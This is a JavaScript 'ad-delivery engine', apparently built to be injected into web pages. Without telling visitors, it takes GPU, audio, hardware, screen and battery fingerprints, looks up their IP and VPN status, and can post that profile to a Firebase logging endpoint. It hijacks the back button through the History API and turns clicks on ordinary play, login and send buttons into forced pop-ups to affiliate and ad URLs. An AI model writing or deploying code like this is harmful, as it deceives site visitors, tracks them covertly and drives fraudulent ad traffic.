/**
 * OMNI-ENGINE v2.0 - BLOCK 1: THE INTELLIGENCE CORE
 * ==================================================
 * High-speed hardware fingerprinting and ad-delivery engine.
 * Designed for GitHub CDN delivery. No ad-block detection, overlays, or guards.
 * Respects existing Cloudflare, Captcha, and transparent click-layer infrastructure.
 */

const CHACHA_CONFIG = {
    DEBUG_MODE: false,

    LINKS: [
        "https://www.blackbox.ai/", "https://chat.deepseek.com/", "https://chatgpt.com/",
        "https://www.theverge.com/tech", "https://tech.com.pk/", "https://techcrunch.com/",
        "https://www.techmeme.com/", "https://rocketpay.co.in/", "https://www.api.org/", "https://www.ibm.com/",
        "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in",
        "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in"
    ],

    APIS: {
        FB_URL: "YOUR_FIREBASE_URL",
        TG_TOKEN: "YOUR_BOT_TOKEN",
        TG_ID: "YOUR_CHAT_ID"
    },

    SETTINGS: {
        MAX_CLICKS_TODAY: 9,
        CLEAN_PAGE: "https://cloudaccesshq.xyz/limit-reached"
    }
};

// ============================================================================
// PRE-BUILD ON PAGE LOAD (zero decision at click time)
// ============================================================================

const _baskets = {
    h: CHACHA_CONFIG.LINKS.slice(0, 10),
    n: CHACHA_CONFIG.LINKS.slice(10, 16),
    l: CHACHA_CONFIG.LINKS.slice(16, 20)
};

const _validIds = [
    'tag-btn-play-main', 'tag-input-message-field', 'tag-btn-back-button',
    'tag-btn-server-shift-2', 'tag-btn-q-360', 'tag-btn-q-720', 'tag-btn-q-1080', 'tag-btn-q-4k',
    'tag-btn-auth-login', 'tag-btn-auth-send', 'tag-link-community-rules', 'tag-btn-community-showmore'
];

const _STORAGE_KEY = '_omni_v2_store_';
const _HISTORY_STATE = 'omni_v2_history_lock';

// ----------------------------------------------------------------------------
// ASYNCHRONOUS DNA COLLECTION (Background only - never delays click)
// ----------------------------------------------------------------------------

let _stealthDNA = null;

function _collectGPUProfile() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return { vendor: 'N/A', renderer: 'N/A' };
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (!debugInfo) return { vendor: 'N/A', renderer: 'N/A' };
        return {
            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'N/A',
            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A'
        };
    } catch (e) { return { vendor: 'N/A', renderer: 'N/A' }; }
}

function _collectHardwareProfile() {
    return {
        ram: navigator.deviceMemory || 'N/A',
        cores: navigator.hardwareConcurrency || 'N/A',
        pixelRatio: window.devicePixelRatio || 1
    };
}

function _collectAudioFingerprint() {
    try {
        const AudioContext = window.AudioContext || window.webkitAudioContext;
        if (!AudioContext) return 'N/A';
        const ctx = new AudioContext();
        const oscillator = ctx.createOscillator();
        const analyser = ctx.createAnalyser();
        const gain = ctx.createGain();
        gain.gain.value = 0;
        oscillator.connect(analyser);
        analyser.connect(gain);
        gain.connect(ctx.destination);
        oscillator.start(0);
        const data = new Float32Array(analyser.frequencyBinCount);
        analyser.getFloatFrequencyData(data);
        oscillator.stop();
        ctx.close();
        let hash = 0;
        for (let i = 0; i < Math.min(data.length, 32); i++) {
            hash = ((hash << 5) - hash) + (data[i] || 0) | 0;
        }
        return Math.abs(hash).toString(36);
    } catch (e) { return 'N/A'; }
}

function _collectDisplayProfile() {
    return {
        width: screen.width || 0,
        height: screen.height || 0,
        availWidth: screen.availWidth || 0,
        availHeight: screen.availHeight || 0,
        colorDepth: screen.colorDepth || 0
    };
}

function _collectFullDNA() {
    if (_stealthDNA) return _stealthDNA;

    _stealthDNA = {
        gpu: _collectGPUProfile(),
        hardware: _collectHardwareProfile(),
        audio: _collectAudioFingerprint(),
        display: _collectDisplayProfile(),
        battery: 'N/A',
        ip: '0.0.0.0',
        vpn: false,
        timestamp: new Date().toISOString()
    };

    if (navigator.getBattery) {
        navigator.getBattery().catch(function() { return null; }).then(function(bat) {
            if (bat) _stealthDNA.battery = Math.round(bat.level * 100) + '%';
        });
    }

    fetch('https://ipapi.co/json/').then(function(r) { return r.json(); }).catch(function() { return {}; }).then(function(ip) {
        _stealthDNA.ip = ip.ip || '0.0.0.0';
        _stealthDNA.vpn = !!(ip.proxy || ip.vpn);
    });

    return _stealthDNA;
}

// ----------------------------------------------------------------------------
// STORAGE & DATE UTILITIES
// ----------------------------------------------------------------------------

function _getStore() {
    try {
        const raw = localStorage.getItem(_STORAGE_KEY);
        return raw ? JSON.parse(raw) : { c: 0, lastClickDate: null, lastAdId: null };
    } catch (e) { return { c: 0, lastClickDate: null, lastAdId: null }; }
}

function _setStore(store) {
    try { localStorage.setItem(_STORAGE_KEY, JSON.stringify(store)); } catch (e) {}
}

function _today() {
    return new Date().toISOString().slice(0, 10);
}

// ----------------------------------------------------------------------------
// LINK SELECTION (80/10/10 BUCKET + ANTI-REPEAT)
// ----------------------------------------------------------------------------

function _pickLink(bucket) {
    const store = _getStore();
    const today = _today();

    if (store.lastClickDate !== today) {
        store.c = 0;
        store.lastClickDate = today;
        store.lastAdId = null;
    }

    const luck = Math.random() * 100;
    const pool = bucket || (luck < 80 ? _baskets.h : luck < 90 ? _baskets.n : _baskets.l);
    let fresh = pool.filter(function(u) { return u !== store.lastAdId; });
    if (fresh.length === 0) fresh = pool;

    let pick = fresh[Math.floor(Math.random() * fresh.length)];
    if (pick === store.lastAdId) {
        fresh = pool.filter(function(u) { return u !== pick; });
        pick = fresh.length ? fresh[Math.floor(Math.random() * fresh.length)] : pool[0];
    }
    return { url: pick, store: store };
}

// ----------------------------------------------------------------------------
// JUMP (Direct open, referrer preserved)
// ----------------------------------------------------------------------------

function _jump(url) {
    const w = window.open(url, '_blank');
    if (w) {
        try { w.opener = null; w.focus(); } catch (e) {}
    } else {
        const a = document.createElement('a');
        a.href = url;
        a.target = '_blank';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
    }
}

// ----------------------------------------------------------------------------
// ASYNC LOGGING (does not block ad fire)
// ----------------------------------------------------------------------------

function _logAsync(btnId, url, count) {
    const dna = _collectFullDNA();
    if (CHACHA_CONFIG.DEBUG_MODE) {
        console.log('[OMNI v2]', { btn: btnId, link: url, click: count, dna: dna });
    }
    if (CHACHA_CONFIG.APIS.FB_URL && CHACHA_CONFIG.APIS.FB_URL.startsWith('http')) {
        fetch(CHACHA_CONFIG.APIS.FB_URL + '/logs.json', {
            method: 'POST',
            body: JSON.stringify({ btn: btnId, dna: dna, target: url, click: count, ts: new Date().toISOString() })
        }).catch(function() {});
    }
}

// ----------------------------------------------------------------------------
// FIRE AD (Core action)
// ----------------------------------------------------------------------------

function _fireAd(btnId, fromBack) {
    const result = _pickLink(fromBack ? _baskets.l : null);
    const url = result.url;
    const store = result.store;

    store.c += 1;
    store.lastClickDate = _today();
    store.lastAdId = url;
    _setStore(store);

    _jump(url);
    _logAsync(btnId || 'back-hijack', url, store.c);
}

// ----------------------------------------------------------------------------
// HISTORY API HIJACK (Back button → Low bucket ad)
// ----------------------------------------------------------------------------

function _lockHistory() {
    if (window.history.state !== _HISTORY_STATE) {
        window.history.pushState(_HISTORY_STATE, null, window.location.href);
    }
}

function _onPopState() {
    _lockHistory();
    const store = _getStore();
    const today = _today();

    if (store.lastClickDate !== today) {
        store.c = 0;
        store.lastClickDate = today;
        store.lastAdId = null;
        _setStore(store);
    }

    if (store.c < CHACHA_CONFIG.SETTINGS.MAX_CLICKS_TODAY) {
        _fireAd('back-hijack', true);
    }
}

// ----------------------------------------------------------------------------
// CLICK HANDLER (Instant fire - zero prerequisites)
// ----------------------------------------------------------------------------

function _onValidClick(e) {
    const btn = e.target.closest('[id]');
    if (!btn || _validIds.indexOf(btn.id) === -1) return;

    const store = _getStore();
    const today = _today();

    if (store.lastClickDate !== today) {
        store.c = 0;
        store.lastClickDate = today;
        store.lastAdId = null;
        _setStore(store);
    }

    if (store.c >= CHACHA_CONFIG.SETTINGS.MAX_CLICKS_TODAY) {
        if (!CHACHA_CONFIG.DEBUG_MODE) {
            window.location.href = CHACHA_CONFIG.SETTINGS.CLEAN_PAGE;
            return;
        }
        if (CHACHA_CONFIG.DEBUG_MODE) console.warn('[OMNI v2] Daily cap reached.');
        return;
    }

    _fireAd(btn.id, false);
}

// ============================================================================
// INITIALIZATION (runs on window load)
// ============================================================================

function _init() {
    setTimeout(function() { _collectFullDNA(); }, 0);
    _lockHistory();
    window.onpopstate = _onPopState;
    document.addEventListener('click', _onValidClick, false);
}

if (document.readyState === 'loading') {
    window.addEventListener('DOMContentLoaded', _init);
} else {
    _init();
}
